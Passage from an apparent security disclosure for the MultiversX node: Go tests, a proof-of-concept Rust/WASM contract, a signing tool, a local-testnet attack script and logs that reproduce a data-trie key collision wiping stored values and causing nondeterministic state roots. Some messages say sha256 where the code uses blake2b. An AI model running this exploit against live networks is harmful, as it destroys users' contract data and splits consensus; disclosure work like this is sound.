func TestChainSimulator_DataTrieKeyCollision_DeterministicKeyDestruction(t *testing.T) {
	if testing.Short() {
		t.Skip("this is not a short test")
	}

	cs := startSimulator(t)
	defer cs.Close()

	wallet, err := cs.GenerateAndMintWalletAddress(0, big.NewInt(0).Mul(oneEGLD, big.NewInt(100)))
	require.Nil(t, err)
	err = cs.GenerateBlocks(1)
	require.Nil(t, err)

	nonce := uint64(0)
	scAddress := deployStore2(t, cs, wallet, &nonce)

	k1 := []byte("deterministic-key-0001")
	v1 := []byte("value stored under K1")
	// the node's data-trie hasher is blake2b: K1's hashed (AutoBalance) leaf physically sits at key blake2b(K1)
	k2 := blake2b.NewBlake2b().Compute(string(k1))
	v2 := []byte("value stored under K2")

	// commit K1's value
	callStore(t, cs, wallet, &nonce, scAddress, "store1", k1, v1)
	require.Equal(t, v1, queryLoad(t, cs, scAddress, k1), "K1 value should be stored after tx1")
	rootAfterK1 := accountRootHash(t, cs, scAddress)
	t.Logf("root hash after storing K1: %s", rootAfterK1)

	// write K2 = blake2b(K1) in an independent transaction
	callStore(t, cs, wallet, &nonce, scAddress, "store1", k2, v2)

	gotK1 := queryLoad(t, cs, scAddress, k1)
	gotK2 := queryLoad(t, cs, scAddress, k2)
	rootAfterK2 := accountRootHash(t, cs, scAddress)

	t.Logf("K1 value after storing K2=blake2b(K1): %q", gotK1)
	t.Logf("K2 value after storing K2=blake2b(K1): %q", gotK2)
	t.Logf("root hash after storing K2:           %s", rootAfterK2)

	// THE BUG: K1's committed leaf has been silently destroyed by the K2 write
	require.Empty(t, gotK1, "vulnerability: writing K2=sha256(K1) deleted K1's stored value")
	require.Equal(t, v2, gotK2, "K2's own value should still be readable")
	require.NotEqual(t, rootAfterK1, rootAfterK2)
}

// TestChainSimulator_DataTrieKeyCollision_NondeterministicStateRoot shows that one transaction
// storing both K1 and K2=sha256(K1) (single execution, single account flush) commits different
// state roots depending on the Go map iteration order of trackableDataTrie.dirtyData: with N
// byte-identical transactions (same keys, same values, fresh contracts), the node commits more
// than one distinct final state. Two honest nodes executing the same block therefore compute
// different state roots and reject each other's blocks: an externally triggerable consensus
// divergence.
func TestChainSimulator_DataTrieKeyCollision_NondeterministicStateRoot(t *testing.T) {
	if testing.Short() {
		t.Skip("this is not a short test")
	}

	cs := startSimulator(t)
	defer cs.Close()

	wallet, err := cs.GenerateAndMintWalletAddress(0, big.NewInt(0).Mul(oneEGLD, big.NewInt(1000)))
	require.Nil(t, err)
	err = cs.GenerateBlocks(1)
	require.Nil(t, err)

	nonce := uint64(0)

	k1 := []byte("nondeterministic-key-01")
	v1 := []byte("v1")
	k2 := blake2b.NewBlake2b().Compute(string(k1))
	v2 := []byte("v2")

	const rounds = 60
	outcomes := make(map[string]int)

	for i := 0; i < rounds; i++ {
		scAddress := deployStore2(t, cs, wallet, &nonce)

		// one transaction writing both keys: the flush order of {K1, K2} decides the outcome
		callStore(t, cs, wallet, &nonce, scAddress, "store2", k1, v1, k2, v2)

		gotK1 := queryLoad(t, cs, scAddress, k1)
		root := accountRootHash(t, cs, scAddress)

		node := cs.GetNodeHandler(0)
		scBech32, _ := node.GetCoreComponents().AddressPubKeyConverter().Encode(scAddress)
		kvPairs, _, errKV := node.GetFacadeHandler().GetKeyValuePairs(scBech32, coreAPI.AccountQueryOptions{})
		if errKV == nil && i < 3 {
			keys := make([]string, 0, len(kvPairs))
			for k := range kvPairs {
				keys = append(keys, fmt.Sprintf("%x", k))
			}
			t.Logf("round %d: raw committed keys: %v", i, keys)
		}

		// the semantic outcome of the byte-identical transaction: is K1's value present or was it destroyed?
		outcome := fmt.Sprintf("K1read=%q", string(gotK1))
		if (i+1)%10 == 0 {
			t.Logf("round %d/%d: load1(K1)=%q load1(K2)=%q", i+1, rounds, string(gotK1), string(queryLoad(t, cs, scAddress, k2)))
		}
		if _, seen := outcomes[outcome]; !seen {
			t.Logf("first occurrence of outcome %q at round %d (contract root hash: %s)", outcome, i+1, root)
		}
		outcomes[outcome]++

		if (i+1)%10 == 0 {
			t.Logf("round %d/%d: distinct outcomes so far: %d", i+1, rounds, len(outcomes))
		}
	}

	t.Logf("=== distinct outcomes across %d byte-identical transactions (same keys, same values, fresh contracts) ===", rounds)
	for outcome, count := range outcomes {
		t.Logf("%4d x  %s", count, outcome)
	}

	require.Greater(t, len(outcomes), 1,
		"vulnerability: identical transactions must always produce the identical semantic state; "+
			"found %d distinct outcomes - the committed state depends on Go map iteration order, so honest nodes "+
			"computing the same block derive different state roots (consensus divergence)", len(outcomes))
}
```

### B 2, PoC contract Rust source

File `integrationTests/chainSimulator/dataTrieCollision/testdata/store2src/lib.rs`.

```rust
#![no_std]

extern "C" {
    fn mBufferNew() -> i32;
    fn mBufferGetArgument(argIndex: i32, bufferHandle: i32) -> i32;
    fn mBufferStorageStore(keyHandle: i32, valueHandle: i32) -> i32;
    fn mBufferStorageLoad(keyHandle: i32, bufferHandle: i32) -> i32;
    fn mBufferFinish(bufferHandle: i32) -> i32;
    fn mBufferGetLength(bufferHandle: i32) -> i32;
}

#[no_mangle]
pub extern "C" fn init() {}

// stores 2 arbitrary (key, value) pairs in ONE execution - same transaction, same account flush
#[no_mangle]
pub extern "C" fn store2() {
    unsafe {
        let k1 = mBufferNew();
        let v1 = mBufferNew();
        let k2 = mBufferNew();
        let v2 = mBufferNew();
        mBufferGetArgument(0, k1);
        mBufferGetArgument(1, v1);
        mBufferGetArgument(2, k2);
        mBufferGetArgument(3, v2);
        mBufferStorageStore(k1, v1);
        mBufferStorageStore(k2, v2);
    }
}

// stores 1 (key, value) pair - for the deterministic cross-tx variant
#[no_mangle]
pub extern "C" fn store1() {
    unsafe {
        let k = mBufferNew();
        let v = mBufferNew();
        mBufferGetArgument(0, k);
        mBufferGetArgument(1, v);
        mBufferStorageStore(k, v);
    }
}

#[no_mangle]
pub extern "C" fn load1() {
    unsafe {
        let k = mBufferNew();
        let v = mBufferNew();
        mBufferGetArgument(0, k);
        let _ = mBufferStorageLoad(k, v);
        mBufferFinish(v);
    }
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
```

### B 3, PoC contract Cargo.toml

File `integrationTests/chainSimulator/dataTrieCollision/testdata/store2src/Cargo.toml`.

```toml
[package]
name = "store2"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[profile.release]
opt-level = 'z'
lto = true
panic = 'abort'
strip = true
```

### B 4, PoC contract compiled binary as base64

File `integrationTests/chainSimulator/dataTrieCollision/testdata/store2.wasm`, 472 bytes, sha256 below. Rebuild the file with the following command then verify the hash before use.

```bash
base64 -d > store2.wasm <<'EOF'
AGFzbQEAAAABEwRgAAF/YAJ/fwF/YAF/AX9gAAACcgUDZW52Cm1CdWZmZXJOZXcAAANlbnYSbUJ1ZmZlckdldEFyZ3VtZW50AAEDZW52E21CdWZmZXJTdG9yYWdlU3RvcmUAAQNlbnYSbUJ1ZmZlclN0b3JhZ2VMb2FkAAEDZW52DW1CdWZmZXJGaW5pc2gAAgMFBAMDAwMFAwEAEAYZA38BQYCAwAALfwBBgIDAAAt/AEGAgMAACwdGBwZtZW1vcnkCAARpbml0AAUGc3RvcmUyAAYGc3RvcmUxAAcFbG9hZDEACApfX2RhdGFfZW5kAwELX19oZWFwX2Jhc2UDAgrVAQQCAAtmAQR/EICAgIAAIQAQgICAgAAhARCAgICAACECEICAgIAAIQNBACAAEIGAgIAAGkEBIAEQgYCAgAAaQQIgAhCBgICAABpBAyADEIGAgIAAGiAAIAEQgoCAgAAaIAIgAxCCgICAABoLNQECfxCAgICAACEAEICAgIAAIQFBACAAEIGAgIAAGkEBIAEQgYCAgAAaIAAgARCCgICAABoLMwECfxCAgICAACEAEICAgIAAIQFBACAAEIGAgIAAGiAAIAEQg4CAgAAaIAEQhICAgAAaCw==
EOF
shasum -a 256 store2.wasm
```

The expected sha256 is b87aa4e111e59cca622847fda17d03468ed355095e74132ff1978b0205ecd5f9 and the expected byte length is 472. The binary is reproducible from B 2 and B 3 with cargo using target wasm32-unknown-unknown.

### C, real node network evidence


### C 1, transaction signer and query tool module definition

File `security-research/regtools/go.mod`.

```text
module regtools

go 1.26

require github.com/multiversx/mx-chain-core-go v1.5.1

require (
	github.com/btcsuite/btcd/btcutil v1.2.0 // indirect
	github.com/denisbrodbeck/machineid v1.0.1 // indirect
	github.com/gogo/protobuf v1.3.2 // indirect
	github.com/golang/protobuf v1.5.2 // indirect
	github.com/mr-tron/base58 v1.3.0 // indirect
	github.com/pelletier/go-toml v1.9.5 // indirect
	golang.org/x/crypto v0.54.0 // indirect
	golang.org/x/sys v0.47.0 // indirect
	google.golang.org/protobuf v1.26.0 // indirect
)
```

### C 2, transaction signer and query tool source

File `security-research/regtools/main.go`.

```go
package main

import (
	"bytes"
	"crypto/ed25519"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/multiversx/mx-chain-core-go/data/transaction"
	"github.com/multiversx/mx-chain-core-go/hashing/keccak"
	"github.com/multiversx/mx-chain-core-go/marshal"
	"github.com/multiversx/mx-chain-core-go/core/pubkeyConverter"
)


// Minimal MultiversX local-testnet driver: signs version-1 transactions with an ed25519 PEM wallet
// and talks to the node REST API. No SDK dependency.

type wallet struct {
	seed []byte
	addr []byte // 32-byte pubkey
}

func loadWallet(path string) *wallet {
	raw, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}
	// MultiversX key pem (filegen format): pem body = ascii hex string of the 64-byte ed25519
	// private key (seed||pub), base64-encoded by the pem encoder.
	var b64 strings.Builder
	inBlock := false
	for _, line := range strings.Split(string(raw), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "-----BEGIN") {
			inBlock = true
			b64.Reset()
			continue
		}
		if strings.HasPrefix(line, "-----END") {
			break
		}
		if inBlock {
			b64.WriteString(line)
		}
	}
	decoded, err := base64.StdEncoding.DecodeString(b64.String())
	if err != nil || len(decoded) < 64 {
		panic("unexpected pem body in " + path)
	}
	keyBytes, err := hex.DecodeString(string(decoded))
	if err != nil || len(keyBytes) != 64 {
		panic("unexpected key hex in " + path)
	}
	seed := keyBytes[:32]
	pub := keyBytes[32:]
	return &wallet{seed: seed, addr: pub}
}

var (
	bech32, _   = pubkeyConverter.NewBech32PubkeyConverter(32, "erd")
	jsonMarshal = &marshal.JsonMarshalizer{}
	keccakHash  = keccak.NewKeccak()
)

func (w *wallet) bech32() string {
	b, _ := bech32.Encode(w.addr)
	return b
}

func encodeBech(b []byte) string {
	s, _ := bech32.Encode(b)
	return s
}

func (w *wallet) sign(nonce uint64, rcv []byte, value *big.Int, data []byte, gasLimit uint64, gasPrice uint64, chainID string) (sigHex, sndBech, txJSON string, hash []byte) {
	tx := &transaction.Transaction{
		Nonce:    nonce,
		Value:    value,
		RcvAddr:  rcv,
		SndAddr:  w.addr,
		GasPrice: gasPrice,
		GasLimit: gasLimit,
		Data:     data,
		ChainID:  []byte(chainID),
		Version:  1,
		Signature: []byte(strings.Repeat("0", 128)),
	}
	signingBytes, err := tx.GetDataForSigning(bech32, jsonMarshal, keccakHash)
	if err != nil {
		panic(err)
	}
	priv := ed25519.NewKeyFromSeed(w.seed)
	sig := ed25519.Sign(priv, signingBytes)

	payload := map[string]interface{}{
		"nonce":    nonce,
		"value":    value.String(),
		"receiver": encodeBech(rcv),
		"sender":   w.bech32(),
		"gasPrice": gasPrice,
		"gasLimit": gasLimit,
		"data":     base64.StdEncoding.EncodeToString(data),
		"signature": hex.EncodeToString(sig),
		"chainID":  chainID,
		"version":  1,
	}
	b, _ := json.Marshal(payload)
	return hex.EncodeToString(sig), w.bech32(), string(b), keccakHash.Compute(string(signingBytes))
}

func post(api, path string, body string) string {
	resp, err := http.Post(api+path, "application/json", bytes.NewReader([]byte(body)))
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func get(api, path string) string {
	resp, err := http.Get(api + path)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

// computeSCAddress replicates blockChainHookImpl.NewAddress for the wasm VM
func computeSCAddress(creator []byte, nonce uint64) []byte {
	buffNonce := make([]byte, 8)
	binary.LittleEndian.PutUint64(buffNonce, nonce)
	adrAndNonce := append(creator, buffNonce...)
	base := keccak.NewKeccak().Compute(string(adrAndNonce))
	copy(base[:8], make([]byte, 8))
	copy(base[8:10], []byte{5, 0})
	copy(base[30:32], creator[30:32])
	return base
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: regtools <cmd> ...")
		os.Exit(1)
	}
	cmd := os.Args[1]
	api := envOr("API", "http://127.0.0.1:10000")
	chainID := envOr("CHAINID", "local-testnet")

	switch cmd {
	case "addr":
		w := loadWallet(os.Args[2])
		fmt.Println(w.bech32())
	case "deploy":
		// deploy <pem> <wasmfile> <nonce>
		w := loadWallet(os.Args[2])
		code, _ := os.ReadFile(os.Args[3])
		nonce := parseUint(os.Args[4])
		data := []byte(hex.EncodeToString(code) + "@0500@0102")
		_, _, txJSON, hash := w.sign(nonce, make([]byte, 32), big.NewInt(0), data, 600000000, 1000000000, chainID)
		fmt.Println("txHash:", hex.EncodeToString(hash))
		fmt.Println("scAddress:", encodeBech(computeSCAddress(w.addr, nonce)))
		fmt.Println("resp:", post(api, "/transaction/send", txJSON))

	case "call":
		// call <pem> <scBech32> <nonce> <function> [hexargs...]
		w := loadWallet(os.Args[2])
		rcv, err := bech32.Decode(os.Args[3])
		if err != nil {
			panic(err)
		}
		nonce := parseUint(os.Args[4])
		function := os.Args[5]
		parts := []string{function}
		for _, a := range os.Args[6:] {
			parts = append(parts, a)
		}
		data := []byte(strings.Join(parts, "@"))
		_, _, txJSON, hash := w.sign(nonce, rcv, big.NewInt(0), data, 600000000, 1000000000, chainID)
		fmt.Println("txHash:", hex.EncodeToString(hash))
		fmt.Println("resp:", post(api, "/transaction/send", txJSON))

	case "query":
		// query <scBech32> <function> [hexargs...]
		body := map[string]interface{}{
			"scAddress": os.Args[2],
			"funcName":  os.Args[3],
			"args":      os.Args[4:],
		}
		b, _ := json.Marshal(body)
		fmt.Println(post(api, "/vm-values/hex", string(b)))

	case "getkey":
		// getkey <scBech32> <hexkey>
		fmt.Println(get(api, "/address/"+os.Args[2]+"/key/"+os.Args[3]))

	case "account":
		// account <bech32>
		fmt.Println(get(api, "/address/"+os.Args[2]))

	case "status":
		// status <txhash-hex>
		fmt.Println(get(api, "/transaction/"+os.Args[2]+"/status"))

	case "wait":
		// wait <seconds>
		d := parseUint(os.Args[2])
		time.Sleep(time.Duration(d) * time.Second)

	case "epoch":
		fmt.Println(get(api, "/network/status/0"))
	}
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func parseUint(s string) uint64 {
	var v uint64
	fmt.Sscanf(s, "%d", &v)
	return v
}
```

### C 3, attack driver script

File `security-research/regtools/attack_driver.sh`.

```bash
#!/bin/bash
PEM=/Users/antics/MultiversX/testnet/node/config/walletKey.pem
WASM=/Users/antics/Documents/mx-chain-go/integrationTests/chainSimulator/dataTrieCollision/testdata/store2.wasm
RT=/tmp/regtools/regtools
WALLET=erd1yfpk24jfnqs6dnezyfegyp8mk3hkmknp552vc0n88hdytms9fg4qkfyx65
OB=http://localhost:10000
V=(http://localhost:9503 http://localhost:9504 http://localhost:9505)
VI=0

getnonce() { curl -s --max-time 5 "$OB/address/$WALLET" | python3 -c "import json,sys; print(json.load(sys.stdin)['data']['account']['nonce'])" 2>/dev/null; }

send() { # args: nonce "kind" rest...
  local N=$1; shift
  local KIND=$1; shift
  local API=${V[$VI]}
  VI=$(( (VI+1) % 3 ))
  if [ "$KIND" = "deploy" ]; then
    $RT deploy $PEM $WASM $N 2>/dev/null | grep scAddress | awk '{print $2}'
  else
    local SC=$1; shift
    API=$API $RT call $PEM $SC $N "$@" >/dev/null 2>&1
  fi
}

waitnonce() { # wait until wallet nonce > $1
  local TARGET=$1
  for i in $(seq 1 30); do
    local NN=$(getnonce)
    if [ "$NN" -gt "$TARGET" ] 2>/dev/null; then echo $NN; return 0; fi
    sleep 4
  done
  echo "TIMEOUT_AT_$TARGET"; return 1
}

K1B=6e6f6e6465742d7265616c2d6e6f64652d6b65792d3031
K2B=2b8188f9e77751cf1eb5d3768d2e8f20d8f1c8967751670fb60a57a93b428b94
K1=64657465726d696e69737469632d6b65792d30303031
K2=4cf815852db3e7fd2a0d937662f1363ebcfa38cee91bd0d8d7f6296e21b03555
V1=76616c75652073746f72656420756e646572204b31
V2=76616c75652073746f72656420756e646572204b32

echo "=== waiting for epoch >= 1 ==="
for i in $(seq 1 40); do
  EP=$(grep -oh "\[0/[0-9]*/[0-9]*/(END_ROUND)\]" ~/MultiversX/testnet/node_working_dirs/validator3/logs/*.log 2>/dev/null | tail -1 | cut -d/ -f2)
  [ -n "$EP" ] && [ "$EP" -ge 1 ] && break
  sleep 6
done
echo "epoch now: $EP"

N=$(getnonce); echo "start nonce: $N"
echo "=== Attack A: deploy + store K1 + store K2=blake2b(K1) ==="
SCA=$(send $N deploy); N=$((N+1)); waitnonce $((N-1)) >/dev/null
echo "contract A: $SCA"
send $N call $SCA store1 $K1 $V1; N=$((N+1)); waitnonce $((N-1)) >/dev/null
echo "load1(K1) before: $($RT query $SCA load1 $K1 | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])')"
send $N call $SCA store1 $K2 $V2; N=$((N+1)); waitnonce $((N-1)) >/dev/null
RA=$($RT query $SCA load1 $K1 | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])')
echo "load1(K1) after K2 write: '$RA'  (empty => destroyed)"

echo ""
echo "=== Attack B: 10 rounds of one-tx store2 (both keys, single flush) ==="
for R in $(seq 1 10); do
  SC=$(send $N deploy); N=$((N+1)); waitnonce $((N-1)) >/dev/null
  send $N call $SC store2 $K1B 7631 $K2B 7632; N=$((N+1)); waitnonce $((N-1)) >/dev/null
  OUT=$($RT query $SC load1 $K1B | python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["data"])' 2>/dev/null)
  if [ "$OUT" = "7631" ]; then STATE="INTACT"; elif [ -z "$OUT" ]; then STATE="DESTROYED"; else STATE="OTHER:$OUT"; fi
  echo "round $R: $SC -> K1b $STATE"
done
echo "FINAL_NONCE=$N"
```

### C 4, real node regtest run transcript

File `security-research/real-node-regtest-run.log`.

```text
=== waiting for epoch >= 1 ===
epoch now: 1
start nonce: 1
=== Attack A: deploy + store K1 + store K2=blake2b(K1) ===
contract A: erd1qqqqqqqqqqqqqpgqa4kyss2sxp8e5w95a6u6wr4m76fans09fg4qnh4j29
load1(K1) before: 76616c75652073746f72656420756e646572204b31
load1(K1) after K2 write: ''  (empty => destroyed)

=== Attack B: 10 rounds of one-tx store2 (both keys, single flush) ===
round 1: erd1qqqqqqqqqqqqqpgqg7p6mxlu07gsw33rtkzt5rqjln40zsmafg4qq6nmrn -> K1b INTACT
round 2: erd1qqqqqqqqqqqqqpgqx9qhgl9j3krfmk2uhm3yx6hpdrlfw8x4fg4qvv8q7a -> K1b DESTROYED
round 3: erd1qqqqqqqqqqqqqpgqlyvhd36mv33qsqh4hdvd22qyqqw6c36mfg4qen5hza -> K1b DESTROYED
round 4: erd1qqqqqqqqqqqqqpgq694f82tfmcv8267t77paagxtdqfj7audfg4q5yz2c5 -> K1b DESTROYED
round 5: erd1qqqqqqqqqqqqqpgqqzzkmcfjrhnh857x0xntxrslp2fyuugxfg4qmpnlmt -> K1b DESTROYED
round 6: erd1qqqqqqqqqqqqqpgql6kmzc4n5pmqsdrtekgnkx4ek4ml6cqzfg4qcz4nsn -> K1b DESTROYED
round 7: erd1qqqqqqqqqqqqqpgqjnda8gsjy9npc35mtpfkpxy5gtf7la4tfg4q6rq2vr -> K1b DESTROYED
round 8: erd1qqqqqqqqqqqqqpgqfhza7u08k4c879f6rs2l6kym2k3356djfg4q49eup2 -> K1b DESTROYED
round 9: erd1qqqqqqqqqqqqqpgq99yrgfntrrkkfy2yrfdhncc8v93dfpdffg4qjftu2z -> K1b DESTROYED
round 10: erd1qqqqqqqqqqqqqpgqvwlyn40g2meq29e9u6athsyknxmk83wxfg4qv54n9u -> K1b OTHER:None
FINAL_NONCE=24
```

### C 5.0, validator0 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator0.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.372] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43281 
[0;32mINFO [0m[2026-10-06 22:01:39.374] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.376] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.398] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.407] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21500/p2p/16Uiu2HAmAPtJ7LuAJN3EsbAM38jXqro9gY1GDFZZhMt2gE4aAbAC [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21500/p2p/16Uiu2HAmAPtJ7LuAJN3EsbAM38jXqro9gY1GDFZZhMt2gE4aAbAC 
[0;32mINFO [0m[2026-10-06 22:01:39.408] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.411] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = metachain 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 4294967295 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.412] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.341] [..nodesCoordinator] [metachain/0/0/] new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.358] [vmContainerFactory] [metachain/0/0/] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.366] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.479] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.482] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.482] [genesis/process]    [metachain/0/0/] genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:09.575] [processProxy]       [metachain/0/0/] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.576] [..hStart/metachain] [metachain/0/0/] rewardsCreatorProxy                      [0;32mconfigured[0m = rewardsCreatorV1 
[0;32mINFO [0m[2026-10-06 22:02:09.597] [factory]            [metachain/0/0/] indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 4294967295 [0;32mhash[0m = f310653903260e6450f3516d6e5fb4cfd30e83ea060fd6281f74688474ff1b5f 
[0;33mWARN [0m[2026-10-06 22:02:09.684] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;33mWARN [0m[2026-10-06 22:02:09.684] [state]              [metachain/0/0/] could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:09.684] [factory]            [metachain/0/0/] starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.692] [node]               [metachain/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:09.726] [processProxy]       [metachain/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:15.006] [headersForBlock]    [metachain/0/3/(BLOCK)] requestMissingAndUpdateBasedOnCrossShardData could not find last notarized [0;33mshard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:15.079] [process/block]      [metachain/0/3/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 3 [0;32mnonce[0m = 1 [0;32mhash[0m = 12a2339fb0730bda3c27b9226935b40d491b42a1dcacaa4d302ac82b60b1ccff 
[0;32mINFO [0m[2026-10-06 22:02:21.016] [process/block]      [metachain/0/4/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 4 [0;32mnonce[0m = 2 [0;32mhash[0m = 951e23813fdcc5cf1567df637cb7b089354c0d087a48d87d24ce1587beba1a1c 
[0;32mINFO [0m[2026-10-06 22:02:27.019] [process/block]      [metachain/0/5/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 5 [0;32mnonce[0m = 3 [0;32mhash[0m = 8519f48973214551eae07f5cce0c02a65859d4df1d6e4a9069bc0c51a18ca923 
[0;32mINFO [0m[2026-10-06 22:02:33.023] [process/block]      [metachain/0/6/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 6 [0;32mnonce[0m = 4 [0;32mhash[0m = 16a2ec737af8fef9da8dfe081fef92eb31712666805b455b68bd0f809bd34272 
[0;32mINFO [0m[2026-10-06 22:02:39.012] [process/block]      [metachain/0/7/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 7 [0;32mnonce[0m = 5 [0;32mhash[0m = 52f596da93a8a4621a9c6348ecf1bf1613c2d547750bddb0fc713641838e84d5 
[0;32mINFO [0m[2026-10-06 22:02:45.024] [process/block]      [metachain/0/8/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 8 [0;32mnonce[0m = 6 [0;32mhash[0m = 78b9669a254564cfd079eb83f0a46a11f1a41edcd4c899c9611c6d81fc4de343 
[0;32mINFO [0m[2026-10-06 22:02:51.024] [process/block]      [metachain/0/9/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 9 [0;32mnonce[0m = 7 [0;32mhash[0m = b55a7e80de17e54723d2758444e4b8379cbf8b0715f384bb5817c43aba353db3 
[0;32mINFO [0m[2026-10-06 22:02:57.021] [process/block]      [metachain/0/10/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 10 [0;32mnonce[0m = 8 [0;32mhash[0m = 5ded2dcf853fd20e5df12172db569ebb30f2f7a103fcceaccc4a493984178597 
[0;32mINFO [0m[2026-10-06 22:03:03.018] [process/block]      [metachain/0/11/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 11 [0;32mnonce[0m = 9 [0;32mhash[0m = a7268cc50bef6890ad5250ae81a421b0eeeba9bee2b81841d0305eb97d08f25d 
[0;32mINFO [0m[2026-10-06 22:03:09.015] [process/block]      [metachain/0/12/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 12 [0;32mnonce[0m = 10 [0;32mhash[0m = 0408be04a4bef43fe9029763ab9fe8fa6ee3f7791dcd8639f9e0bf5452a09c54 
[0;32mINFO [0m[2026-10-06 22:03:15.011] [process/block]      [metachain/0/13/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 13 [0;32mnonce[0m = 11 [0;32mhash[0m = a358a2d844e36110bb0c66af1bd18394b76c9ed82b56e69246b2146315ebf300 
[0;32mINFO [0m[2026-10-06 22:03:21.025] [process/block]      [metachain/0/14/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 14 [0;32mnonce[0m = 12 [0;32mhash[0m = 8868b55de9e2f0f527cecf61a6e88dba0267902bab72107d39ba7cac14afbbe7 
[0;32mINFO [0m[2026-10-06 22:03:27.021] [process/block]      [metachain/0/15/(END_ROUND)] meta block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 4294967295 [0;32mround[0m = 15 [0;32mnonce[0m = 13 [0;32mhash[0m = f59d0806e2761391b02e5b2217f634afa362b8a1409f7f2075e7981bc141b6bd 
